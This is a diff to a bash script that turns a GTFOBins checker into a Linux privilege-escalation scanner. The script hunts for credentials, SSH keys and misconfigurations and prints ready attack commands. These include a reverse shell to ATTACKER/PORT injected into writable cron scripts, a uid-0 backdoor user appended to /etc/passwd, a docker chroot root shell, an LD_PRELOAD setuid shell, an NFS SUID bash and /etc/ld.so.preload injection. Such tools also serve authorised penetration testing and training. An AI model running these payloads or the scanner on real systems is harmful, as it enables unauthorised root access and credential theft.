@@ -1,7 +1,10 @@
 #!/bin/bash
-# GTFOBins Auto-Checker — finds exploitable SUID, SGID, capabilities, and sudo on this system
+# GTFOBins Auto-Checker + Extended Linux Privilege Escalation Scanner
+# Checks: SUID, SGID, capabilities, sudo, cron, PATH hijack, kernel,
+#          docker/lxd groups, NFS, /etc/passwd+shadow, systemd, credentials,
+#          LD_PRELOAD, internal services, writable /etc, .service files
 # Data: GTFOBins (https://gtfobins.github.io/) — 435 binaries
-# Generated: 2026-11-06
+# Generated: 2026-11-06 | Extended: 2026-11-11
 
 RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'
 
@@ -1827,6 +1830,7 @@ zypper x' ;;
 FOUND=0
 FOUND_GTFO=0
 FOUND_OTHER_USER=0
+FOUND_EXTRA=0
 ME=$(id -un 2>/dev/null || whoami 2>/dev/null)
 MY_GROUPS=$(id -Gn 2>/dev/null)
 
@@ -1848,6 +1852,20 @@ show_owner_hit() {
     echo -e "    Path: $path  Perms: $perms"
     FOUND=$((FOUND+1))
     FOUND_OTHER_USER=$((FOUND_OTHER_USER+1))
+}
+
+show_extra() {
+    local desc="$1" detail="$2" suggestion="$3"
+    echo -e "  ${RED}✗${NC} ${BOLD}${desc}${NC}"
+    [ -n "$detail" ] && echo -e "    ${detail}"
+    if [ -n "$suggestion" ]; then
+        echo -e "    ${CYAN}Suggestion:${NC}"
+        echo "$suggestion" | while IFS= read -r line; do
+            echo -e "      ${GREEN}$line${NC}"
+        done
+    fi
+    FOUND=$((FOUND+1))
+    FOUND_EXTRA=$((FOUND_EXTRA+1))
 }
 
 show_exploit() {
@@ -2024,6 +2042,377 @@ elif [ "$SUDOERS_READABLE" = false ]; then
     echo -e "  ${YELLOW}Tip: if you get a password later, run: sudo -l${NC}"
 fi
 
+# ==============================================================================
+# EXTENDED PRIVILEGE ESCALATION CHECKS
+# ==============================================================================
+
+# --- Kernel version ---
+header "Kernel Version"
+KERN=$(uname -r 2>/dev/null)
+KERN_FULL=$(uname -a 2>/dev/null)
+echo -e "  Kernel: ${BOLD}${KERN}${NC}"
+echo -e "  Full:   ${KERN_FULL}"
+echo -e "  ${CYAN}Suggestion:${NC}"
+echo -e "    ${GREEN}searchsploit linux kernel ${KERN%%.*}.${KERN#*.}${NC}"
+echo -e "    ${GREEN}# Or check: https://github.com/briskets/CVE-2021-3493${NC}"
+echo -e "    ${GREEN}# Or check: https://github.com/ly4k/PwnKit (CVE-2021-4034)${NC}"
+FOUND=$((FOUND+1))
+FOUND_EXTRA=$((FOUND_EXTRA+1))
+
+# --- Cron jobs ---
+header "Cron Jobs"
+echo -e "  ${CYAN}[System crontabs]${NC}"
+CRON_FOUND=false
+for crontab in /etc/crontab /etc/cron.d/*; do
+    [ -r "$crontab" ] || continue
+    CRON_FOUND=true
+    echo -e "  ${GREEN}Readable:${NC} $crontab"
+    grep -v '^#' "$crontab" 2>/dev/null | grep -v '^$' | grep -v '^[[:space:]]*$' | while IFS= read -r line; do
+        echo -e "    $line"
+        # Check if referenced scripts/binaries are writable
+        script_path=$(echo "$line" | grep -oP '(/[^\s;|&>]+)' | head -1)
+        if [ -n "$script_path" ] && [ -w "$script_path" ] 2>/dev/null; then
+            show_extra "Writable cron script: $script_path" "Crontab: $crontab" "echo '/bin/sh -i >& /dev/tcp/ATTACKER/PORT 0>&1' >> $script_path"
+        fi
+    done
+done
+[ "$CRON_FOUND" = false ] && echo -e "  ${YELLOW}No readable system crontabs${NC}"
+
+echo ""
+echo -e "  ${CYAN}[Per-user crontabs]${NC}"
+if [ -d /var/spool/cron/crontabs ] && ls /var/spool/cron/crontabs/ 2>/dev/null | grep -q .; then
+    for uc in /var/spool/cron/crontabs/*; do
+        if [ -r "$uc" ]; then
+            echo -e "  ${GREEN}Readable:${NC} $uc (user: $(basename "$uc"))"
+            grep -v '^#' "$uc" 2>/dev/null | grep -v '^$' | while IFS= read -r line; do
+                echo -e "    $line"
+            done
+        else
+            echo -e "  ${YELLOW}Exists but not readable:${NC} $uc"
+        fi
+    done
+elif [ -d /var/spool/cron ] && ls /var/spool/cron/ 2>/dev/null | grep -q .; then
+    for uc in /var/spool/cron/*; do
+        [ -d "$uc" ] && continue
+        if [ -r "$uc" ]; then
+            echo -e "  ${GREEN}Readable:${NC} $uc (user: $(basename "$uc"))"
+            grep -v '^#' "$uc" 2>/dev/null | grep -v '^$' | while IFS= read -r line; do
+                echo -e "    $line"
+            done
+        else
+            echo -e "  ${YELLOW}Exists but not readable:${NC} $uc"
+        fi
+    done
+else
+    echo -e "  ${YELLOW}No per-user crontabs found or not readable${NC}"
+fi
+
+echo ""
+echo -e "  ${CYAN}[Cron directories — writable scripts]${NC}"
+for crondir in /etc/cron.daily /etc/cron.hourly /etc/cron.weekly /etc/cron.monthly; do
+    [ -d "$crondir" ] || continue
+    for script in "$crondir"/*; do
+        [ -f "$script" ] || continue
+        if [ -w "$script" ]; then
+            show_extra "Writable cron script: $script" "Dir: $crondir" "# Inject payload into $script"
+        fi
+    done
+done
+
+echo ""
+echo -e "  ${CYAN}[Systemd timers]${NC}"
+if command -v systemctl &>/dev/null; then
+    systemctl list-timers --all --no-pager 2>/dev/null | head -20 | while IFS= read -r line; do
+        echo -e "  $line"
+    done
+else
+    echo -e "  ${YELLOW}systemctl not found${NC}"
+fi
+
+# --- Writable PATH directories ---
+header "Writable PATH Directories"
+echo -e "  ${CYAN}[Directories in PATH that you can write to — command hijacking]${NC}"
+PATH_HIT=false
+IFS=':' read -ra DIRS <<< "$PATH"
+for dir in "${DIRS[@]}"; do
+    [ -d "$dir" ] || continue
+    if [ -w "$dir" ]; then
+        PATH_HIT=true
+        show_extra "Writable PATH dir: $dir" "Any cron/service using unqualified commands can be hijacked" "echo '#!/bin/bash\n/bin/sh' > $dir/TARGET_COMMAND && chmod +x $dir/TARGET_COMMAND"
+    fi
+done
+[ "$PATH_HIT" = false ] && echo -e "  ${YELLOW}No writable PATH directories${NC}"
+
+# --- Docker / LXD group membership ---
+header "Interesting Group Memberships"
+echo -e "  ${CYAN}[Current user groups]${NC}"
+echo -e "  $(id)"
+echo ""
+
+PRIV_GROUPS="docker lxd lxc disk adm video shadow"
+for grp in $PRIV_GROUPS; do
+    if id -nG 2>/dev/null | grep -qw "$grp"; then
+        case "$grp" in
+            docker)
+                show_extra "Member of 'docker' group" "Full root access via Docker" "docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh"
+                ;;
+            lxd|lxc)
+                show_extra "Member of '$grp' group" "Full root access via LXD/LXC containers" "# See: https://github.com/h050sh/LXD-privesc"
+                ;;
+            disk)
+                show_extra "Member of 'disk' group" "Raw disk read/write — can read /etc/shadow directly" "debugfs /dev/sda1\ncat /etc/shadow"
+                ;;
+            adm)
+                show_extra "Member of 'adm' group" "Can read most logs in /var/log — credential harvesting" "grep -rn 'pass\|pwd\|token\|key' /var/log/ 2>/dev/null"
+                ;;
+            shadow)
+                show_extra "Member of 'shadow' group" "Can read /etc/shadow — crack password hashes" "cat /etc/shadow\n# Then: john --wordlist=rockyou.txt shadow.txt"
+                ;;
+            video)
+                show_extra "Member of 'video' group" "Can capture screen/framebuffer" "cat /dev/fb0 > screenshot.raw"
+                ;;
+        esac
+    fi
+done
+
+# --- /etc/passwd and /etc/shadow ---
+header "/etc/passwd & /etc/shadow"
+if [ -w /etc/passwd ]; then
+    show_extra "/etc/passwd is WRITABLE" "Add a root user or remove root password" "echo 'hacker:\$6\$salt\$hash:0:0:root:/root:/bin/bash' >> /etc/passwd"
+else
+    echo -e "  ${YELLOW}/etc/passwd is not writable${NC}"
+fi
+
+if [ -r /etc/shadow ]; then
+    show_extra "/etc/shadow is READABLE" "Password hashes can be cracked offline" "cat /etc/shadow\n# Then: john --wordlist=rockyou.txt shadow.txt\n# Or:   hashcat -m 1800 shadow.txt rockyou.txt"
+else
+    echo -e "  ${YELLOW}/etc/shadow is not readable (normal)${NC}"
+fi
+
+# Check for empty password hashes in passwd
+EMPTY_PW=$(awk -F: '($2 == "" || $2 == "x" && NR==FNR) {next} ($2 == "") {print $1}' /etc/passwd 2>/dev/null)
+if [ -n "$EMPTY_PW" ]; then
+    show_extra "Users with empty password field in /etc/passwd" "$EMPTY_PW" "su - $EMPTY_PW"
+fi
+
+# Check for password hashes in /etc/passwd (not 'x')
+HASH_IN_PASSWD=$(awk -F: '($2 != "x" && $2 != "*" && $2 != "!" && $2 != "!!" && $2 != "") {print $1 ":" $2}' /etc/passwd 2>/dev/null)
+if [ -n "$HASH_IN_PASSWD" ]; then
+    show_extra "Password hashes found directly in /etc/passwd" "$HASH_IN_PASSWD" "# Crack with john or hashcat"
+fi
+
+# --- NFS shares ---
+header "NFS Exports (no_root_squash)"
+if [ -r /etc/exports ]; then
+    echo -e "  ${GREEN}/etc/exports is readable:${NC}"
+    cat /etc/exports 2>/dev/null | while IFS= read -r line; do
+        echo -e "  $line"
+        if echo "$line" | grep -q "no_root_squash"; then
+            SHARE=$(echo "$line" | awk '{print $1}')
+            show_extra "NFS share with no_root_squash: $SHARE" "Mount remotely as root, place SUID binary" "# From attacker:\nmount -t nfs TARGET:$SHARE /mnt\ncp /bin/bash /mnt/bash && chmod +s /mnt/bash\n# On target:\n/mnt/bash -p"
+        fi
+    done
+else
+    echo -e "  ${YELLOW}/etc/exports not readable or doesn't exist${NC}"
+fi
+if command -v showmount &>/dev/null; then
+    echo ""
+    echo -e "  ${CYAN}[showmount output]${NC}"
+    showmount -e localhost 2>/dev/null | while IFS= read -r line; do
+        echo -e "  $line"
+    done
+fi
+
+# --- Systemd services/paths writable ---
+header "Writable Systemd Service Files"
+echo -e "  ${CYAN}[Service files you can modify — service hijacking]${NC}"
+SVC_HIT=false
+for svcdir in /etc/systemd/system /usr/lib/systemd/system /lib/systemd/system /run/systemd/system; do
+    [ -d "$svcdir" ] || continue
+    while IFS= read -r svc; do
+        [ -z "$svc" ] && continue
+        if [ -w "$svc" ]; then
+            SVC_HIT=true
+            show_extra "Writable service file: $svc" "" "# Modify ExecStart to run your payload\n# Then: systemctl daemon-reload && systemctl restart $(basename "$svc")"
+        fi
+    done < <(find "$svcdir" -maxdepth 1 -name '*.service' -type f 2>/dev/null)
+done
+[ "$SVC_HIT" = false ] && echo -e "  ${YELLOW}No writable service files found${NC}"
+
+# --- LD_PRELOAD / LD_LIBRARY_PATH ---
+header "LD_PRELOAD / LD_LIBRARY_PATH"
+echo -e "  ${CYAN}[Environment-based library injection]${NC}"
+# Check if sudo preserves LD_PRELOAD
+if echo "$SUDO_OUTPUT" | grep -qi "LD_PRELOAD\|env_keep.*LD"; then
+    show_extra "sudo preserves LD_PRELOAD or LD_LIBRARY_PATH" "Library injection via sudo" "# Compile: gcc -fPIC -shared -o /tmp/pe.so pe.c -nostartfiles\n# pe.c: void _init() { setuid(0); system(\"/bin/sh\"); }\nsudo LD_PRELOAD=/tmp/pe.so <allowed_binary>"
+fi
+# Check env for LD_PRELOAD
+if [ -n "$LD_PRELOAD" ]; then
+    show_extra "LD_PRELOAD is set in environment" "Value: $LD_PRELOAD" "# Inspect what library is being loaded"
+fi
+if [ -n "$LD_LIBRARY_PATH" ]; then
+    show_extra "LD_LIBRARY_PATH is set in environment" "Value: $LD_LIBRARY_PATH" "# Check if writable dirs are in the path — place malicious .so"
+fi
+# Check /etc/ld.so.conf for writable paths
+if [ -r /etc/ld.so.conf ]; then
+    while IFS= read -r libdir; do
+        [ -z "$libdir" ] && continue
+        echo "$libdir" | grep -q '^#' && continue
+        echo "$libdir" | grep -q '^include' && continue
+        if [ -d "$libdir" ] && [ -w "$libdir" ]; then
+            show_extra "Writable library path in /etc/ld.so.conf: $libdir" "" "# Place a malicious .so and run ldconfig"
+        fi
+    done < /etc/ld.so.conf
+fi
+
+# --- Credentials in common files ---
+header "Credential Hunting"
+echo -e "  ${CYAN}[Interesting files with potential credentials]${NC}"
+CRED_FILES=(
+    "$HOME/.bash_history"
+    "$HOME/.zsh_history"
+    "$HOME/.mysql_history"
+    "$HOME/.psql_history"
+    "/etc/mysql/my.cnf"
+    "/etc/my.cnf"
+    "$HOME/.my.cnf"
+    "/etc/shadow.bak"
+    "/etc/passwd.bak"
+    "/var/log/auth.log"
+    "/etc/openvpn/auth.txt"
+    "/etc/ppp/chap-secrets"
+    "/etc/ppp/pap-secrets"
+    "/etc/inetd.conf"
+    "/etc/xinetd.conf"
+    "/var/www/.env"
+    "/opt/.env"
+    "/etc/environment"
+)
+for cf in "${CRED_FILES[@]}"; do
+    if [ -r "$cf" ] && [ -f "$cf" ] && [ -s "$cf" ]; then
+        echo -e "  ${GREEN}Readable:${NC} $cf ($(stat -c '%U:%G %a' "$cf" 2>/dev/null || stat -f '%Su:%Sg %p' "$cf" 2>/dev/null))"
+        FOUND=$((FOUND+1))
+        FOUND_EXTRA=$((FOUND_EXTRA+1))
+    fi
+done
+
+echo ""
+echo -e "  ${CYAN}[SSH keys — readable private keys]${NC}"
+SSH_KEY_FOUND=false
+for keydir in /home/*/.ssh /root/.ssh; do
+    [ -d "$keydir" ] || continue
+    for keyfile in "$keydir"/id_* "$keydir"/*key*; do
+        [ -f "$keyfile" ] || continue
+        echo "$keyfile" | grep -q '\.pub$' && continue
+        if [ -r "$keyfile" ]; then
+            SSH_KEY_FOUND=true
+            show_extra "Readable SSH private key: $keyfile" "Owner: $(stat -c '%U:%G' "$keyfile" 2>/dev/null)" "ssh -i $keyfile user@target"
+        fi
+    done
+done
+[ "$SSH_KEY_FOUND" = false ] && echo -e "  ${YELLOW}No readable SSH private keys found${NC}"
+
+echo ""
+echo -e "  ${CYAN}[.env and config files with passwords — quick scan]${NC}"
+ENV_COUNT=0
+while IFS= read -r envfile; do
+    [ -z "$envfile" ] && continue
+    if grep -qiE '(password|passwd|pwd|secret|token|api_key|apikey|db_pass)' "$envfile" 2>/dev/null; then
+        echo -e "  ${GREEN}Potential creds:${NC} $envfile"
+        grep -inE '(password|passwd|pwd|secret|token|api_key|apikey|db_pass)' "$envfile" 2>/dev/null | head -3 | while IFS= read -r match; do
+            echo -e "    $match"
+        done
+        ENV_COUNT=$((ENV_COUNT+1))
+        FOUND=$((FOUND+1))
+        FOUND_EXTRA=$((FOUND_EXTRA+1))
+    fi
+    [ "$ENV_COUNT" -ge 20 ] && echo -e "  ${YELLOW}... (showing first 20)${NC}" && break
+done < <(find /var/www /opt /srv /home /etc -maxdepth 3 \( -name '.env' -o -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name 'wp-config.php' -o -name 'config.php' -o -name 'database.yml' -o -name 'settings.py' -o -name 'application.properties' \) -readable -type f 2>/dev/null)
+
+# --- Internal services running as root ---
+header "Internal Services Running as Root"
+echo -e "  ${CYAN}[Listening services — check for local-only root services]${NC}"
+if command -v ss &>/dev/null; then
+    ss -tlnp 2>/dev/null | while IFS= read -r line; do
+        echo -e "  $line"
+    done
+elif command -v netstat &>/dev/null; then
+    netstat -tlnp 2>/dev/null | while IFS= read -r line; do
+        echo -e "  $line"
+    done
+else
+    echo -e "  ${YELLOW}Neither ss nor netstat found${NC}"
+fi
+
+echo ""
+echo -e "  ${CYAN}[Processes running as root — look for exploitable services]${NC}"
+ps aux 2>/dev/null | awk '$1 == "root"' | grep -vE '(\[.*\]|init|systemd$)' | head -30 | while IFS= read -r line; do
+    echo -e "  $line"
+done
+
+# --- Writable /etc files ---
+header "Writable Files in /etc"
+echo -e "  ${CYAN}[Config files you can modify — potential for privilege escalation]${NC}"
+ETC_HIT=false
+INTERESTING_ETC=(
+    "/etc/passwd"
+    "/etc/shadow"
+    "/etc/sudoers"
+    "/etc/crontab"
+    "/etc/ssh/sshd_config"
+    "/etc/hosts"
+    "/etc/hostname"
+    "/etc/resolv.conf"
+    "/etc/ld.so.conf"
+    "/etc/ld.so.preload"
+    "/etc/environment"
+    "/etc/profile"
+    "/etc/bash.bashrc"
+    "/etc/pam.d/common-auth"
+    "/etc/pam.d/su"
+    "/etc/security/access.conf"
+    "/etc/login.defs"
+    "/etc/fstab"
+    "/etc/exports"
+    "/etc/anacrontab"
+    "/etc/logrotate.conf"
+    "/etc/rsyslog.conf"
+)
+for etcfile in "${INTERESTING_ETC[@]}"; do
+    if [ -w "$etcfile" ] 2>/dev/null; then
+        ETC_HIT=true
+        echo -e "  ${RED}✗${NC} ${BOLD}Writable:${NC} $etcfile"
+        FOUND=$((FOUND+1))
+        FOUND_EXTRA=$((FOUND_EXTRA+1))
+    fi
+done
+# Special: /etc/ld.so.preload
+if [ -w /etc/ld.so.preload ] 2>/dev/null; then
+    show_extra "/etc/ld.so.preload is WRITABLE" "Global library preloading — every process loads your .so" "# Compile malicious .so, then:\necho '/tmp/evil.so' > /etc/ld.so.preload"
+elif [ ! -f /etc/ld.so.preload ] && [ -w /etc/ ] 2>/dev/null; then
+    show_extra "/etc/ is writable and /etc/ld.so.preload doesn't exist" "You can create it" "echo '/tmp/evil.so' > /etc/ld.so.preload"
+fi
+[ "$ETC_HIT" = false ] && echo -e "  ${YELLOW}No writable interesting /etc files${NC}"
+
+# --- Mounted filesystems / unmounted in fstab ---
+header "Filesystem & Mount Info"
+echo -e "  ${CYAN}[Mounted filesystems — look for nosuid/noexec missing]${NC}"
+mount 2>/dev/null | grep -vE '(proc|sys|devpts|tmpfs|cgroup)' | while IFS= read -r line; do
+    if echo "$line" | grep -qv "nosuid"; then
+        echo -e "  ${GREEN}•${NC} $line"
+    else
+        echo -e "  ${YELLOW}•${NC} $line"
+    fi
+done
+
+echo ""
+echo -e "  ${CYAN}[Unmounted partitions in /etc/fstab]${NC}"
+if [ -r /etc/fstab ]; then
+    grep -v '^#' /etc/fstab 2>/dev/null | grep -v '^$' | while IFS= read -r line; do
+        echo -e "  $line"
+    done
+fi
+
 # --- Summary ---
 echo ""
 echo -e "${BOLD}══════════════════════════════════════════════════════${NC}"
@@ -2031,7 +2420,8 @@ if [ "$FOUND" -gt 0 ]; then
     echo -e "${GREEN}${BOLD}  $FOUND findings total${NC}"
     [ "$FOUND_GTFO" -gt 0 ] && echo -e "  ${GREEN}├─ $FOUND_GTFO GTFOBins exploitable${NC}"
     [ "$FOUND_OTHER_USER" -gt 0 ] && echo -e "  ${YELLOW}├─ $FOUND_OTHER_USER run-as-other-user (lateral movement)${NC}"
-    OTHER=$((FOUND - FOUND_GTFO - FOUND_OTHER_USER))
+    [ "$FOUND_EXTRA" -gt 0 ] && echo -e "  ${CYAN}├─ $FOUND_EXTRA extended privesc checks${NC}"
+    OTHER=$((FOUND - FOUND_GTFO - FOUND_OTHER_USER - FOUND_EXTRA))
     [ "$OTHER" -gt 0 ] && echo -e "  ${CYAN}└─ $OTHER other interesting files${NC}"
     echo -e "  Reference: ${CYAN}https://gtfobins.github.io/${NC}"
 else
